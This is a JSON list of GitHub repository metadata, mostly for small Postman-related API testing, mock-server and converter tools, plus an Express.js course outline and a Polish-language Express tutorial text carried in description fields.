  {
    "id": 144600969,
    "name": "devops-postman-tests",
    "full_name": "jscrobinson/devops-postman-tests",
    "description": "Run postman tests from JSON file",
    "fork": false,
    "created_at": "2018-08-13T15:47:20Z",
    "updated_at": "2018-08-14T12:00:16Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 235064,
    "owner_login": "jscrobinson",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/235064?v=4",
    "pulled": 1,
    "tags": [
      "test",
      " postman",
      "file",
      "tests",
      "tests ",
      "postman tests"
    ]
  },
  {
    "id": 238608833,
    "name": "test-postman-jenkin",
    "full_name": "infinetys/test-postman-jenkin",
    "description": null,
    "fork": false,
    "created_at": "2020-02-06T04:39:53Z",
    "updated_at": "2020-02-06T04:48:22Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 22219829,
    "owner_login": "infinetys",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/22219829?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 220351385,
    "name": "Postman-Backup-Tests",
    "full_name": "SteveStatia/Postman-Backup-Tests",
    "description": null,
    "fork": false,
    "created_at": "2019-11-08T00:01:05Z",
    "updated_at": "2019-11-08T00:04:19Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 26208352,
    "owner_login": "SteveStatia",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/26208352?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 168756533,
    "name": "Postman-Newman-API-Testing-FCOM-Test-Phrase-",
    "full_name": "shasha131/Postman-Newman-API-Testing-FCOM-Test-Phrase-",
    "description": "How to use postman/Newman to do data driven(large data file) API request and testing ",
    "fork": false,
    "created_at": "2019-02-01T20:31:43Z",
    "updated_at": "2019-02-01T20:35:48Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 41800014,
    "owner_login": "shasha131",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/41800014?v=4",
    "pulled": 1,
    "tags": [
      "test",
      " postman",
      "data",
      "testing",
      "request",
      "file",
      "to do",
      "drive",
      "driven"
    ]
  },
  {
    "id": 142451555,
    "name": "postmango",
    "full_name": "agilov/postmango",
    "description": "Mock server that works with postman mock server file format",
    "fork": false,
    "created_at": "2018-07-26T14:20:40Z",
    "updated_at": "2019-08-18T14:45:02Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 1,
    "watchers": 0,
    "score": 1,
    "owner_id": 825624,
    "owner_login": "agilov",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/825624?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "form",
      "file",
      "server",
      "format",
      "mock"
    ]
  },
  {
    "id": 119582645,
    "name": "PostmanMockHousehold",
    "full_name": "JConrad10/PostmanMockHousehold",
    "description": null,
    "fork": false,
    "created_at": "2018-01-30T19:18:08Z",
    "updated_at": "2018-01-30T19:18:08Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 35972846,
    "owner_login": "JConrad10",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/35972846?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 66381229,
    "name": "postman2mockingjay",
    "full_name": "amishyn/postman2mockingjay",
    "description": null,
    "fork": false,
    "created_at": "2016-08-23T15:51:10Z",
    "updated_at": "2016-08-23T15:51:27Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 4602,
    "owner_login": "amishyn",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/4602?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 133409252,
    "name": "bundle_runner_files",
    "full_name": "mastermalone/bundle_runner_files",
    "description": "Bash scripts to create .json files used for Postman runners",
    "fork": false,
    "created_at": "2018-05-14T19:09:02Z",
    "updated_at": "2019-01-25T19:34:00Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 652063,
    "owner_login": "mastermalone",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/652063?v=4",
    "pulled": 1,
    "tags": [
      "create",
      "file",
      "script",
      "json",
      "files",
      "scripts",
      "runner",
      "runners"
    ]
  },
  {
    "id": 210287041,
    "name": "AUK",
    "full_name": "tripathysagar/AUK",
    "description": "first version of document generator for postman collection result. please run main.py , and update the name of the file in main.py",
    "fork": false,
    "created_at": "2019-09-23T07:06:08Z",
    "updated_at": "2019-09-26T12:42:03Z",
    "stargazers_count": 1,
    "watchers_count": 1,
    "forks": 0,
    "watchers": 1,
    "score": 1,
    "owner_id": 54429599,
    "owner_login": "tripathysagar",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/54429599?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "collect",
      "collection",
      "postman collection",
      "file",
      "document",
      "update",
      "version",
      "generator",
      "name",
      "result",
      "main",
      "please"
    ]
  },
  {
    "id": 231821484,
    "name": "json2md",
    "full_name": "accubits/json2md",
    "description": "Converting Postman JSON to MD file format.",
    "fork": false,
    "created_at": "2020-01-04T20:06:08Z",
    "updated_at": "2020-01-04T20:13:21Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 28808210,
    "owner_login": "accubits",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/28808210?v=4",
    "pulled": 1,
    "tags": [
      "form",
      "file",
      "format"
    ]
  },
  {
    "id": 60399832,
    "name": "postman-json",
    "full_name": "xiaopangzhu/postman-json",
    "description": null,
    "fork": false,
    "created_at": "2016-06-04T08:00:34Z",
    "updated_at": "2019-08-17T09:04:03Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 16118251,
    "owner_login": "xiaopangzhu",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/16118251?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 175104543,
    "name": "OfficeAddInPostmanSSO",
    "full_name": "markyroden/OfficeAddInPostmanSSO",
    "description": "JSON file for Postman example",
    "fork": false,
    "created_at": "2019-03-12T00:23:49Z",
    "updated_at": "2019-03-19T00:18:47Z",
    "stargazers_count": 1,
    "watchers_count": 1,
    "forks": 0,
    "watchers": 1,
    "score": 1,
    "owner_id": 1692884,
    "owner_login": "markyroden",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/1692884?v=4",
    "pulled": 1,
    "tags": [
      "file",
      "example"
    ]
  },
  {
    "id": 226298847,
    "name": "Sky_Loadium_Postman2Jmx",
    "full_name": "skylauriam/Sky_Loadium_Postman2Jmx",
    "description": "Utility to convert a postman json file to jmeter jmx file",
    "fork": false,
    "created_at": "2019-12-06T10:02:03Z",
    "updated_at": "2020-01-14T16:26:39Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 54891224,
    "owner_login": "skylauriam",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/54891224?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "file",
      "json",
      "convert",
      "jmeter"
    ]
  },
  {
    "id": 168422382,
    "name": "FRaaS-Postman",
    "full_name": "ForgeCloud/FRaaS-Postman",
    "description": "JSON files with current Postman Scripts / Environments",
    "fork": false,
    "created_at": "2019-01-30T22:02:24Z",
    "updated_at": "2019-10-30T16:43:55Z",
    "stargazers_count": 1,
    "watchers_count": 1,
    "forks": 0,
    "watchers": 1,
    "score": 1,
    "owner_id": 35542888,
    "owner_login": "ForgeCloud",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/35542888?v=4",
    "pulled": 1,
    "tags": [
      "file",
      "files",
      "rent",
      "current"
    ]
  },
  {
    "id": 107642297,
    "name": "TestCasesToJSON",
    "full_name": "endyquang/TestCasesToJSON",
    "description": "A tool that help parsing test cases from excel files to postman format.",
    "fork": false,
    "created_at": "2017-10-20T06:49:11Z",
    "updated_at": "2019-01-22T15:23:47Z",
    "stargazers_count": 1,
    "watchers_count": 1,
    "forks": 0,
    "watchers": 1,
    "score": 1,
    "owner_id": 28825116,
    "owner_login": "endyquang",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/28825116?v=4",
    "pulled": 1,
    "tags": [
      "test",
      " postman",
      "form",
      "file",
      "tool",
      "format",
      "help",
      "files",
      "case",
      "cases",
      "excel",
      "parsing"
    ]
  },
  {
    "id": 168412273,
    "name": "ReadMeExporter",
    "full_name": "jmone15/ReadMeExporter",
    "description": "Export Postman JSON API List to README.MD file",
    "fork": false,
    "created_at": "2019-01-30T20:43:25Z",
    "updated_at": "2019-01-30T20:56:47Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 10926207,
    "owner_login": "jmone15",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/10926207?v=4",
    "pulled": 1,
    "tags": [
      "file"
    ]
  },
  {
    "id": 131483815,
    "name": "todolistpostmancollection",
    "full_name": "AnilDeshpande/todolistpostmancollection",
    "description": "Just contains POSTMAN collection json files which can be imported by the people who want to use this to test the web services",
    "fork": false,
    "created_at": "2018-04-29T10:05:05Z",
    "updated_at": "2018-09-30T14:40:52Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 3,
    "watchers": 0,
    "score": 1,
    "owner_id": 7361268,
    "owner_login": "AnilDeshpande",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/7361268?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "collect",
      "collection",
      "file",
      "service",
      "json",
      "contain",
      "files",
      "services",
      "import",
      "imported"
    ]
  },
  {
    "id": 205506231,
    "name": "parrot",
    "full_name": "cncal/parrot",
    "description": "A tool used to parse json file exported from Postman and generate apidoc automatically.",
    "fork": false,
    "created_at": "2019-08-31T06:34:57Z",
    "updated_at": "2019-09-02T09:51:31Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 23520240,
    "owner_login": "cncal",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/23520240?v=4",
    "pulled": 1,
    "tags": [
      "file",
      "tool",
      "call",
      "json",
      "auto",
      "automat",
      "generate",
      "export",
      "automatic",
      "parse",
      "exported",
      "automatically",
      "apidoc"
    ]
  },
  {
    "id": 143275857,
    "name": "swagger2postman",
    "full_name": "thneeb/swagger2postman",
    "description": "This little nodejs tool gets a swagger.json on the one hand and generated a postman collection file for testing the specified api on the other hand.",
    "fork": false,
    "created_at": "2018-08-02T09:54:03Z",
    "updated_at": "2018-11-20T08:14:35Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 26486066,
    "owner_login": "thneeb",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/26486066?v=4",
    "pulled": 1,
    "tags": [
      "test",
      " postman",
      "collect",
      "collection",
      "testing",
      "postman collection",
      "file",
      "tool",
      "node",
      "json",
      "generate",
      "spec",
      "swagger",
      "nodejs",
      "generated",
      "gets",
      "little"
    ]
  },
  {
    "id": 134546261,
    "name": "Adobe-Air-Assistant",
    "full_name": "SaffronCode/Adobe-Air-Assistant",
    "description": "Descriptor file editor for Adobe Air",
    "fork": false,
    "created_at": "2018-05-23T09:31:30Z",
    "updated_at": "2020-03-25T09:42:00Z",
    "stargazers_count": 18,
    "watchers_count": 18,
    "forks": 1,
    "watchers": 18,
    "score": 1,
    "owner_id": 39374550,
    "owner_login": "SaffronCode",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/39374550?v=4",
    "pulled": 1,
    "tags": [
      "file",
      "script",
      "edit",
      "editor"
    ]
  },
  {
    "id": 169420355,
    "name": "netFIELD-postman",
    "full_name": "HilscherAutomation/netFIELD-postman",
    "description": "These JSON files allow the use of Postman to easily integrate the API's offered in netFIELD.io into your code.",
    "fork": false,
    "created_at": "2019-02-06T14:39:41Z",
    "updated_at": "2020-03-05T15:37:07Z",
    "stargazers_count": 1,
    "watchers_count": 1,
    "forks": 0,
    "watchers": 1,
    "score": 1,
    "owner_id": 27953469,
    "owner_login": "HilscherAutomation",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/27953469?v=4",
    "pulled": 1,
    "tags": [
      "file",
      "code",
      "files",
      "integrate",
      "easily",
      "offered"
    ]
  },
  {
    "id": 211309703,
    "name": "Postman-To-JMeter-Converter",
    "full_name": "renjitrk/Postman-To-JMeter-Converter",
    "description": "Converts Postman Collection V2.1 JSON Export to JMeter JMX file with list of all API calls arranged in Simple Controllers.",
    "fork": false,
    "created_at": "2019-09-27T12:02:36Z",
    "updated_at": "2019-10-05T17:45:14Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 33802165,
    "owner_login": "renjitrk",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/33802165?v=4",
    "pulled": 1,
    "tags": [
      "file",
      "call",
      "calls",
      "list",
      "arranged"
    ]
  },
  {
    "id": 177333498,
    "name": "varman",
    "full_name": "KevCui/varman",
    "description": ":guardsman: A script to generate postman/newman global variable json from human readable yaml file",
    "fork": false,
    "created_at": "2019-03-23T19:50:10Z",
    "updated_at": "2019-08-10T19:03:42Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 14293537,
    "owner_login": "KevCui",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/14293537?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "file",
      "script",
      "json",
      "newman",
      "generate",
      "read",
      "variable",
      "yaml",
      "guardsman",
      "readable",
      "human"
    ]
  },
  {
    "id": 241176513,
    "name": "api-to-md",
    "full_name": "mateusbzerra/api-to-md",
    "description": "A NodeJS application to generate a beauty markdown file from Insomnia/Postman JSON file.",
    "fork": false,
    "created_at": "2020-02-17T18:15:23Z",
    "updated_at": "2020-02-18T04:24:25Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 17644982,
    "owner_login": "mateusbzerra",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/17644982?v=4",
    "pulled": 1,
    "tags": [
      "file",
      "application",
      "generate",
      "markdown",
      "beauty"
    ]
  },
  {
    "id": 199407927,
    "name": "ServletsTask_Part1",
    "full_name": "Mipside/ServletsTask_Part1",
    "description": " Servlets task with CRUD Operations, json files that are testing via Postman",
    "fork": false,
    "created_at": "2019-07-29T08:08:14Z",
    "updated_at": "2019-07-29T08:11:58Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 1,
    "watchers": 0,
    "score": 1,
    "owner_id": 45482921,
    "owner_login": "Mipside",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/45482921?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "testing",
      "file",
      "json",
      "files",
      "task",
      "lets"
    ]
  },
  {
    "id": 192278627,
    "name": "API-ASSIGNMENT",
    "full_name": "AnuradhaTrivedi/API-ASSIGNMENT",
    "description": "In this assignment fectch the json value for flower,Cake and Plants in view.php file and hit the url on Postman tool",
    "fork": false,
    "created_at": "2019-06-17T05:10:49Z",
    "updated_at": "2019-06-17T07:47:56Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 31591709,
    "owner_login": "AnuradhaTrivedi",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/31591709?v=4",
    "pulled": 1,
    "tags": [
      "file",
      "tool",
      "json",
      "sign",
      "view",
      "assignment",
      "fectch"
    ]
  },
  {
    "id": 177665978,
    "name": "Jedi",
    "full_name": "KennethNL/Jedi",
    "description": "This experimental project involved the conversion of a Gherkin-based input file to a JSON-based configuration of Postman with the end goal of API testing.",
    "fork": false,
    "created_at": "2019-03-25T21:16:17Z",
    "updated_at": "2019-04-10T10:01:18Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 44347880,
    "owner_login": "KennethNL",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/44347880?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "testing",
      "file",
      "based",
      "version",
      "config",
      "configuration",
      "experiment",
      "goal",
      "experimental"
    ]
  },
  {
    "id": 214824652,
    "name": "car-rental-management",
    "full_name": "achu1998/car-rental-management",
    "description": "A Car-Rental-Management developed on node and mongodb and deployed in heroku. The postman collection is in postman-collection.json file.  Add car page doesn't have front end . Car are manually added through the body which is clearly mentioned in the README.md file. This repository has the files implemented in localhost.Visit this repo:",
    "fork": false,
    "created_at": "2019-10-13T13:25:18Z",
    "updated_at": "2019-10-14T15:35:10Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 43047640,
    "owner_login": "achu1998",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/43047640?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "collect",
      "collection",
      "repo",
      "postman collection",
      "file",
      "repos",
      "repository",
      "node",
      "json",
      "develop",
      "implement",
      "mongo",
      "files",
      "local",
      "front",
      "host",
      "mongod",
      "mongodb",
      "developed",
      "deployed",
      "implemented",
      "front end",
      "heroku",
      "added",
      "manua",
      "early"
    ]
  },
  {
    "id": 82122922,
    "name": "chatapp",
    "full_name": "Inn4ki/chatapp",
    "description": "NODE.JS WEB APPS WITH EXPRESS by Wes Higbee  In this Node.js Web Apps with Express training course, expert author Wes Higbee will teach you how to create web applications and APIs with Express. This course is designed for users that are already familiar with HTML, CSS, and JavaScript.  You will start by learning how to set up a web app, then jump into learning about the Jade view engine. From there, Wes will teach you about CRUD, including how to add the chat room view, respond with JSON, and edit chat rooms. This video tutorial also covers routers, middleware, APIs, and logging and debugging. Finally, you will learn about auth with passport, including passport user validation, protecting admin routes, and query string parameters.  Once you have completed this computer based training course, you will have learned how to create web applications and APIs with Express. Working files are included, allowing you to follow along with the author throughout the lessons.  About the Publisher  Presented in stunning HD quality, the Infinite Skills range of video based training provides a clear and concise way to learn computer applications and programming languages at your own speed. Delivered to your Desktop, iPad ...  More about Infinite Skills Table of Contents Setting Up A Web App What You Will Learn 00:03:28 About The Author 00:01:23 Project Setup 00:02:14 Spinning Up Our Server From Scratch 00:05:11 Serving Index.HTML 00:04:32 Serving Bootstrap Assets 00:05:52 Styling Our Site 00:01:16 How To Access Your Working Files 00:01:15 The Jade View Engine Why View Engines? 00:02:10 The Jade View Engine 00:06:32 HTML Tags In Jade 00:02:16 Attributes Classes And Ids In Jade 00:02:06 Serving Up Jade Views 00:04:24 HTML Reuse In Jade 00:06:26 Code In Jade Views 00:02:37 Passing Data To View Rendering 00:02:01 Setting A Default View Engine 00:00:37 String Interpolation In Jade 00:02:30 Generating Tables In Jade 00:03:50 Tabs And Spaces Oh My 00:01:21 Demystifying Jade 00:02:21 Crud Setting The Stage 00:01:01 Add Chat Room View 00:04:21 Post Chat Room Form 00:06:56 Parsing Form Data From The Request Body 00:04:22 Responding With JSON 00:03:20 Admin Chat Rooms Workflow 00:02:21 Named Route Parameters To Delete Rooms 00:05:59 Edit Chat Rooms 00:06:01 Edit Chat Rooms Part - 2 00:02:00 Responding With 404 Not Found 00:01:39 Wrap Up 00:01:23 Routers Extracting An Admin Module 00:04:47 Modular Admin Router 00:04:00 Pluggable Admin Mount Path 00:03:15 Stumbling Block - Relative Redirects 00:02:49 Chaining Routes 00:01:57 Middleware Understanding Routing And Middleware 00:05:45 Adding Custom Logging Middleware 00:02:15 Understanding Next() 00:01:31 Middleware To Fetch Data 00:07:24 Order Matters.Av 00:01:09 Scoping Middleware 00:03:53 What To Do With Errors 00:03:01 Last Thoughts 00:03:19 APIs A Client Side Chat App 00:01:55 Setup The Client Side Chat App 00:03:01 Creating An API 00:05:42 Modules Are Singletons 00:01:50 Postman To Test API 00:01:24 API Get Room Messages 00:05:49 Posting To An API 00:03:37 API To Delete Messages 00:03:15 Parsing JSON In The Request Body 00:03:25 Logging And Debugging Express-Debug 00:03:03 Logging With Morgan 00:01:45 File Access Log With Morgan 00:01:28 Built-In Express Debugging 00:01:57 When Things Go Wrong Throwing An Error In A Route Handler 00:01:39 Errors In Production 00:01:53 Custom Error Handlers 00:02:40 Browser Hangs 00:00:58 Hanging Async Request Handlers 00:01:17 Errors In Callbacks 00:03:32 Don't Swallow Callback Errors 00:02:46 Auth With Passport Auth With Passport 00:01:49 Login Form 00:06:31 Passport User Validation 00:05:20 Passport Session Serialization 00:01:49 Logging In 00:06:23 Logout 00:03:52 Authorizing Access To Block Anonymous Users 00:03:40 Protecting Admin Routes 00:02:04 Using User Information 00:02:48 Bypassing Login In Development 00:03:11 Query String Parameters 00:02:34 Auth Cookies 00:02:17 Last Thoughts 00:05:45  Publisher: Infinite Skills Release Date: March 2016 ISBN: 9781491958933 Running time: 4:09:49 Topic: Node.js",
    "fork": false,
    "created_at": "2017-02-16T00:56:43Z",
    "updated_at": "2019-11-16T05:23:17Z",
    "stargazers_count": 4,
    "watchers_count": 4,
    "forks": 5,
    "watchers": 4,
    "score": 1,
    "owner_id": 9013039,
    "owner_login": "Inn4ki",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/9013039?v=4",
    "pulled": 1,
    "tags": [
      "create",
      "form",
      "file",
      "application",
      "user",
      "based",
      "sign",
      "format",
      "auth",
      "files",
      "route",
      "routes",
      "star",
      "read",
      "users",
      "learn",
      "view",
      "course",
      "start",
      "rating",
      "provide",
      "learning",
      "program",
      "tutorial",
      "web app",
      "long",
      "lang",
      "complete",
      "design",
      "edit",
      "including",
      "along",
      "applications",
      "included",
      "validation",
      "designed",
      "sync",
      "parameter",
      "middleware",
      "ready",
      "debug",
      "query",
      "sets",
      "provides",
      "training",
      "router",
      "engine",
      "language",
      "covers",
      "passport",
      "lesson",
      "admin",
      "programming",
      "familiar",
      "logging",
      "passing",
      "debugging",
      "video",
      "quality",
      "chat",
      "protecting",
      "completed",
      "speed",
      "learned",
      "computer"
    ]
  },
  {
    "id": 119091462,
    "name": "Zadanie_17_5",
    "full_name": "martinproxy0/Zadanie_17_5",
    "description": " 17. ExpressJS - ekspresowe tworzenie aplikacji w NodeJS Wyzwania: Dowiesz się czym jest ExpressJS Nauczysz się korzystać z routingu Poznasz czym są szablony 17.1. Wprowadzenie do Expressa Express jest jednym z najpopularniejszych frameworków dla aplikacji pisanych w Node.js. Jest bardzo lekki i pozwala na lepszą organizację aplikacji w modelu MVC. Ok, zwolnijmy. Już na samym starcie pojawiły się dwa pojęcia, których do tej pory nie omówiliśmy zbyt dokładnie: framework i MVC. Na początku przypomnijmy sobie czym jest framework.  Czym są frameworki? Framework to swego rodzaju szkielet, na którym opieramy budowę naszej aplikacji. Jest pewnym poziomem abstrakcji, na której konstruujemy naszą aplikację.  Czym jest abstrakcja? Abstrakcja w inżynierii oprogramowania to technika, dzięki której jesteśmy w stanie zapanować nad złożonością systemu. Najzwyczajniej w świecie nie da się myśleć na wielu płaszczyznach na raz, dlatego programiści dzielą problemy na pewne poziomy i to na nich rozwiązują mniejsze problemy. Przykładowo - programista korzystający z Reacta nie martwi się o niższy poziom abstrakcji, z którego nieświadomie korzysta używając Reacta. Korzystając z komputera także nie zastanawiamy się za bardzo co dzieje się w środku procesora czy też w jaki sposób jest skonstruowany. Tym poziomem abstrakcji po prostu nie zawracamy sobie głowy. Używając JavaScriptu nie myślimy w jaki sposób parser analizuje składnię języka. Jeśli nie jest to nam potrzebne, to możemy zająć się tym, co jest dla nas naprawdę istotne - pisaniem aplikacji internetowych!  Express to właśnie kolejny, wyższy poziom abstrakcji, dzięki któremu możemy skupić się na właściwym problemie. Zawiera zbiór generycznych (możliwych do zastosowania w wielu miejscach / uniwersalnych) funkcjonalności, które powtarzają się w obrębie każdej aplikacji. Cały zamysł frameworka opiera się na zasadzie - nie wymyślaj koła na nowo, bo można budować na podstawie dobrych, uniwersalnych rozwiązań. Po wykonaniu tego samego zadania wiele razy, człowiek instynktownie szuka sposobu na automatyzację problemu - szczególnie leniwy programista. :)  Framework ma niestety jedną wadę, która bywa momentami również zaletą - narzuca programiście sposób w jaki należy rozwiązać problem. Takie podejście z jednej strony nieco nas ogranicza, bo nie pozwala nam 'grzebać' w rozwiązaniu, a z drugiej strony zmniejsza ilość miejsc, w których moglibyśmy popełnić jakiś błąd. Zaletą takiego podejścia jest też to, że programiści korzystający z frameworków często borykają się z podobnymi problemami, przez co łatwo jest znaleźć rozwiązania, bo ktoś już na pewno zetknął się z czymś, co sprawia nam kłopot :)  Wracając do Expressa - jest on niewielkim frameworkiem, który daje programiście przyjemną podstawkę do tworzenia aplikacji, ale nie narzuca żadnych praktyk - może o tym świadczyć chociażby fakt, że wiele znanych frameworków opiera swoją budowę na Express. Można do nich zaliczyć przykładowo Loopbacka, Sailsa czy Krakena.  Model-View-Controller Ok, wiemy już czym jest framework - pora na pojęcie MVC :) Jest to skrót od ang. Model View Controller (Model Widok Kontroler). Jest jednym z najczęściej przewijających się wzorców architektonicznych w internecie. Popularnością pomału wypiera go architektura Flux, o której coraz częściej słychać (szczególnie w środowisku Reacta), ale o tym wzorcu powiemy sobie jeszcze przy okazji omawiania Reduxa - wróćmy do MVC.  Głównym założeniem przyjętym podczas projektowania MVC było oddzielenie warstwy prezentacji od logiki biznesowej aplikacji. To podejście umożliwia tworzenie narzędzi działających bez graficznego interfejsu (zastępuje go wtedy tzw. Command Line Interface, a.k.a. CLI) i jest dalej popularne w środowisku Unixowym. Tak więc:  Model jest reprezentacją logiki aplikacji / problemu z jakim się zmagamy / domeną. Widok opisuje w jaki sposób coś wyświetlić. W React są to komponenty (szczególnie te prezentacyjne). Kontroler przyjmuje dane od użytkownika aplikacji i reaguje na jego działania w obrębie widoku. Aktualizuje widok i model aplikacji. O samej architekturze można napisać osobny moduł tym bardziej, że jak już wcześniej wspomnieliśmy bardzo często przewija się on w środowisku front-end developerów i jest częścią składową wielu frameworków. Sama implementacja MVC wymaga wiedzy na temat programowania obiektowego i wzorców projektowych. Zainteresowanych zapraszam do przeczytania tej książki na temat wzorców projektowych stosowanych w JavaScripcie.  Express dostarcza wielu funkcjonalności do tworzenia aplikacji webowych. Jak już wspomniałem, ułatwia on przede wszystkim szybki rozwój aplikacji opartych na Node.js. Podstawowymi cechami tego frameworka są:  serwowanie plików statycznych za pomocą jednej komendy konfigurowanie middleware, czyli pośrednika między żądaniem a odpowiedzią w momencie, kiedy użytkownik wykonuje jakieś akcje, np. wysyła formularz, middleware może wykonać pewne czynności zanim dane zostaną zapisane. Nie sprowadza się to oczywiście tylko do zapisu danych, ale szerzej na temat tego zagadnienia powiemy sobie w dalszym rozdziale definiowanie tablicy routingu, czyli ścieżek (adresów), które wyświetlają odpowiednie treści, przyjmują i zapisują dane, bądź odpytane o dane zwracają je. Bazują na protokole HTTP oraz URI (ang. Uniform Resource Identifier) pozwala na dynamiczne tworzenie stron HTML bazujących na argumentach przekazanych do istniejących szablonów Nie przejmuj się, jeśli powyższe opisy wydają się być nieco zagmatwane. Kolejne rozdziały rozjaśnią sprawę! Zanim jednak przejdziemy do omawiania poszczególnych funkcjonalności Expressa, przeprowadzimy proces instalacji.  Jeśli masz wątpliwości do powyższego materiału, to - zanim zatwierdzisz - zapytaj na czacie :) Zapoznałe(a)m się! 17.2. Instalacja ExpressJS Framework Express instalujemy używając npm, analogicznie do innych pakietów, które dodawaliśmy już we wcześniejszych modułach. Dla przypomnienia, wystarczy, że zainicjujesz swój projekt - npm init, a następnie użyjesz komendy npm install express --save, która zapisze zainstalowany pakiet w katalogu node_modules/ i doda go do sekcji dependencies w pliku package.json.  Razem z Expressem należy zainstalować jeszcze jeden ważny moduł - body-parser, który jest pakietem pozwalającym na obsługę różnych formatów danych w middleware takich jak JSON, text czy tzw. surowe dane (ang. raw data). Aby go zainstalować, wpisz npm install body-parser --save.  Pierwsza aplikacja w ExpressJS Sprawdźmy teraz, czy wszystko działa tak jak powinno. Testowa aplikacja, jaką stworzymy przy użyciu Expressa, będzie przedstawiała podstawową zasadę działania tego frameworka. Aplikacja uruchomi serwer oraz będzie nasłuchiwać na porcie 3000 w oczekiwaniu na połączenie - dokładnie w taki sam sposób, jak w przypadku serwera HTTP napisanego w “czystym\" Node.js. Nasłuchiwanie oznacza nic innego jak oczekiwanie na połączenie - po wystąpieniu żądania, serwer odpowie nam klasycznym “Hello world\".  Zanim zaczniemy tworzyć aplikację, musimy wytłumaczyć sobie pewne pojęcia.  Opis pojęcia routingu Routing to sposób określania jak aplikacja będzie odpowiadać na żądania klienta na dane endpointy przy użyciu konkretnych metod HTTP. Przypomnijmy sobie w jaki sposób wyglądały metody HTTP:  GET - najprostsza z metod HTTP - służy do pobierania zasobów z serwera. Pobranymi zasobami mogą być np. pliki HTML, CSS, JavaScript czy obiekty JSON / XML. POST - ta metoda jest używana do wysyłania danych do serwera. Stosuje się ją np. przy formularzach lub przy wstawianiu zdjęć i wysyłaniu ich jako załącznik. Zwykle dane te wysyłane są jako para klucz-wartość. PUT - działa podobnie jak POST, czyli również służy do wysyłania danych. Różnicą jest ograniczenie do wysłania tylko jednej porcji danych - np. jednego pola. Metoda ta najczęściej używana jest do aktualizacji istniejących danych DELETE - metoda, która służy do usuwania danych z serwera. 